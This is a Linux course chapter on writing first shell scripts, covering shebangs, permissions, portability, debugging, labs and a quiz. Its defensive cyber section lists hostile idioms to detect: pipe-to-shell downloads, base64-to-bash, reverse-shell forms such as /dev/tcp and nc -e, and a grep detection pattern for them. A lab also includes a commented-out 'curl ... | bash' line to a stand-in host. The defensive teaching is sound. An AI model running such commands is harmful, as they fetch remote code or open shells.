# Chapter 24 · Writing Your First Script
📖 Book: Part IV, pp. 327–336 · ⏱ ~90 min · Prereq: Part 3 · **Start of automation**

## Learning goals
- Understand what a shell script is and how it runs
- Write, make executable, and run a script (shebang, `chmod`, `PATH`)
- Use good habits: comments, indentation, syntax checking, tracing
- Write scripts that work on bash, zsh-based systems, and minimal systems

## 1. Core concepts
A **shell script** is a text file of commands. Three things make it work:
1. **A shebang line** at the top: `#!/usr/bin/env bash` (finds bash in `PATH`) or `#!/bin/bash` (fixed path) or `#!/bin/sh` (POSIX shell, maximum portability).
2. **Execute permission:** `chmod 755 script.sh` (or `700` for private scripts).
3. **A way to find it:** run as `./script.sh`, with a full path, or place it in a directory in `PATH` (such as `~/bin`).

| Concept | Notes |
|---|---|
| Comments | `# text` (everything after `#` is ignored) |
| Line continuation | End the line with `\` |
| Exit status | `exit 0` = success; non-zero = failure; read last status with `$?` |
| Run without `chmod` | `bash script.sh` |
| Syntax check | `bash -n script.sh` (parses but doesn't run) |
| Trace | `bash -x script.sh` (prints each command as it runs) |
| Lint | `shellcheck script.sh` (install: `apt/dnf/pacman/apk/brew install shellcheck`) |

**Portability notes**
- **Alpine/BusyBox** has `ash` as `/bin/sh` and **no bash by default** (`apk add bash`). Debian/Ubuntu's `/bin/sh` is `dash` (no bash-isms such as `[[ ]]`, arrays, `<( )`).
- **macOS** ships bash **3.2** (old, no associative arrays) and uses zsh as the login shell; scripts with `#!/bin/bash` still run bash 3.2. `brew install bash` for 5.x.
- **Windows line endings (CRLF)** break scripts (`/bin/bash^M: bad interpreter`). Fix with `dos2unix script.sh` or `tr -d '\r' < in > out`. Check with `file script.sh` or `cat -A`.
- Linux ignores the **setuid bit on scripts** (a security feature), so scripts can't be made setuid.

## 2. Walkthrough
```bash
mkdir -p ~/linux-lab/scripts ~/bin && cd ~/linux-lab/scripts
cat > hello.sh <<'EOT'
#!/usr/bin/env bash
# hello.sh - my first script
echo "Hello, $(whoami)! Today is $(date -u +%F) (UTC)"
EOT
./hello.sh            # fails: Permission denied (not executable)
bash hello.sh         # works without the execute bit
chmod 755 hello.sh
./hello.sh
cp hello.sh ~/bin/hello && hello      # works if ~/bin is in PATH (chapter 11)
bash -n hello.sh && echo "syntax OK"
bash -x hello.sh
```

### A useful first tool: `recon-lite.sh`
```bash
#!/usr/bin/env bash
# recon-lite.sh - first-minute host facts (read-only, safe to run)
echo "== Host facts =="
echo "Time (UTC): $(date -u +%FT%TZ)"
echo "Host      : $(hostname)"
echo "User      : $(whoami) (uid $(id -u))"
echo "Kernel    : $(uname -sr)"
. /etc/os-release 2>/dev/null          # defines PRETTY_NAME on most Linux distros
echo "OS        : ${PRETTY_NAME:-unknown}"
echo "Uptime    : $(uptime)"
echo "Disk (/)  : $(df -h / | tail -1)"
```
`${PRETTY_NAME:-unknown}` means "use `unknown` if the variable is empty or unset" (more in chapter 34).

## 3. Style that saves you
- Header comment: purpose, usage, author, date
- Meaningful names; indent 2 or 4 spaces; one idea per line
- Prefer long options in scripts for readability (`ls --all` vs `ls -a`) where portable
- Quote variables: `"$var"`
- Test on a copy and as a non-root user first

## 4. 🔐 Cyber relevance
- **Scripts are how attacks and defenses scale.** Defenders automate triage, hunting, and hardening; attackers automate recon and persistence. Reading unknown scripts safely is a core skill: `less`, `bash -n`, `shellcheck`, and **never** `curl URL | bash`.
- **Permission hygiene:** scripts that run with elevated rights (cron, sudo, systemd) must be **owned by root and not writable by others**: `sudo chown root:root script.sh; sudo chmod 750 script.sh`. A writable root-run script is a privilege-escalation path. Same for the **directories** containing them.
- **`#!/usr/bin/env bash` depends on `PATH`**; in privileged contexts use an absolute `#!/bin/bash` so a poisoned `PATH` can't substitute another interpreter. Also set `PATH` explicitly inside privileged scripts: `PATH=/usr/sbin:/usr/bin:/sbin:/bin`.
- **Temporary files:** never use predictable names (`/tmp/out.txt`) because attackers can pre-create symlinks. Use `mktemp`: `tmp=$(mktemp)` or `tmpdir=$(mktemp -d)`; clean up when done.
- **Defensive defaults:** start sensitive scripts with `umask 077`; consider `set -u` (error on unset variables) and, once you understand the trade-offs, `set -e` and `set -o pipefail`. (`set -e` has surprising exceptions, so test carefully.)
- **No secrets in scripts or arguments:** command lines are visible in `ps` and shell history. Read secrets from protected files or prompts (chapter 28).
- **Integrity of your toolkit:** keep your scripts under version control (`git`) and record hashes: `sha256sum *.sh > scripts.sha256`. On an incident host, run tools from read-only media you trust rather than from the possibly compromised system.
- **Lint for security bugs:** `shellcheck` flags unquoted variables, dangerous globs, and misuse of `rm -rf $dir/*`. Make it part of your habit.
- **Detecting malicious scripts:** look for `base64 -d | bash`, `curl|wget ... | sh`, `chmod +x /tmp/`, `nohup`, edits to `crontab`, `~/.bashrc`, `authorized_keys`, and reverse-shell idioms (`/dev/tcp/`, `nc -e`, `bash -i`). `grep -nE 'curl|wget|base64|/dev/tcp|nc |chmod|crontab|authorized_keys' file.sh` is a good first pass (never execute to find out).

## 5. Labs
**Easy**
1. Create `hello.sh`, make it executable, and run it three ways: `bash hello.sh`, `./hello.sh`, and from `~/bin` as `hello`.
2. Run `bash -n` and `bash -x` on it. Describe the difference.
3. Add a comment header with purpose and date.

**Medium**
4. Write `recon-lite.sh` from above, run it, and save the output with `tee` to a timestamped file.
5. Create a script with CRLF line endings (`printf '#!/bin/bash\r\necho hi\r\n' > crlf.sh`), observe the error, fix it with `tr -d '\r'`.
6. Make `hello.sh` print your name from the first argument: `echo "Hello, $1"` (preview of chapter 32) and run `./hello.sh Alice`.

**Hard (cyber)**
7. Write `perm-check.sh` that prints `ls -l` of `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, and `~/.ssh` (ignore errors with `2>/dev/null`). Make it owned by you with mode `700`.
8. Write a script that creates a temp directory with `mktemp -d`, writes a file in it, prints its path, and removes it. Explain why predictable `/tmp` names are dangerous.
9. Install `shellcheck` and lint a script containing `rm -rf $dir/*` and `cat $file`. Read each warning and fix them.
10. Obtain (or write) a harmless "suspicious" script containing `curl http://example.invalid/x | bash` on a line that is commented out or inside an `echo`. Use the `grep` pattern above to detect risky idioms without running the script.

## 6. Common mistakes
- Missing or wrong shebang (`#! /bin/bash` is fine; `# !/bin/bash` is just a comment)
- Forgetting `chmod +x`
- CRLF line endings
- Using bash-only features with `#!/bin/sh`
- Assuming `~/bin` is in `PATH` (open a new login shell after adding it)

## 7. Quiz
1. What does the shebang do?
2. Which two commands help you debug without changing the script?
3. Why is a writable root-run script dangerous?
4. How do you create a temp file safely?
5. Why doesn't the setuid bit work on scripts?

<details><summary>Answers</summary>

1. It tells the kernel which interpreter should run the file.
2. `bash -n` (syntax check) and `bash -x` (trace).
3. Anyone who can modify it can run commands as root.
4. `mktemp` / `mktemp -d`.
5. The OS ignores it to prevent race-condition privilege escalation via interpreters.
</details>

## 8. Mastery checklist
- [ ] I can write, protect, and run a script three ways
- [ ] I debug with `bash -n`, `bash -x`, and `shellcheck`
- [ ] I know the portability pitfalls (dash, BusyBox, macOS bash 3.2, CRLF)
- [ ] I protect scripts and temp files properly

## Next → `25-starting-a-project.md`
